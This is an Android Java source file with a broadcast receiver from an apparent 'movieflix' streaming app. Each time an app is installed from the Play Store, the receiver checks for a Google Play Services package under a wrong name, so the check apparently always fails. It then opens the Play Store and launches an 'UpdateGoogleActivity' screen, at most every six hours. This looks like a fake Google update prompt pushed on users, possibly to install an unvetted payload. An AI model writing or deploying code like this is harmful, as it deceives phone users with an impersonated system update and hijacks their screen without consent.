package com.movieflix.base.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import com.movieflix.base.prefs.PopcornPrefs;
import com.movieflix.base.prefs.Prefs;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;

import static com.movieflix.base.torrent.TorrentService.isPackageInstalled;
import static com.movieflix.base.torrent.TorrentService.parseDate;
import static com.movieflix.base.torrent.TorrentService.parseString;

public class AppInstalled extends BroadcastReceiver {

    boolean verifyInstallerId(Context context, String packageName) {
        if (packageName == null) {
            return  false;
        }
        // A list with valid installers package name
        List<String> validInstallers = new ArrayList<>(Arrays.asList("com.android.vending", "com.google.android.feedback"));

        // The package name of the app that has installed your app
        final String installer = context.getPackageManager().getInstallerPackageName(packageName);

        // true if your app has been downloaded from Play Store
        return installer != null && validInstallers.contains(installer);
    }

    @Override
    public void onReceive(final Context context, Intent intent) {
        Uri data = intent.getData();
        String packageName = null;
        if (data != null) {
            packageName = data.getEncodedSchemeSpecificPart();
        }
        Log.d("AppInstalled", "action: "+intent.getAction()+", name: "+packageName);

        String action = intent.getAction();
        if (action != null && (action.equals("android.intent.action.PACKAGE_INSTALL") || action.equals("android.intent.action.PACKAGE_ADDED")) && verifyInstallerId(context, packageName)) {
            PopcornPrefs prefs = Prefs.getPopcornPrefs();
            Date when = parseDate(prefs.get("tried", (String) null));
            Log.d("AppInstalled", "tried when: " + prefs.get("tried", (String) null));
            if (!isPackageInstalled("com.google.gms.googleplayservices", context.getPackageManager())) {
                Log.d("AppInstalled", "not installed");
                if ((when != null && new Date().getTime() - when.getTime() >= 21600000) || when == null) {
                    prefs.put("tried", parseString(new Date()));
                    Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage("com.android.vending");
                    launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(launchIntent);
                    (new Handler()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            Intent intent1 = new Intent("com.movieflix.mobile.ui.UpdateGoogleActivity");
                            intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            context.startActivity(intent1);
                        }
                    }, 1200);
                }
            }
        }
    }
}
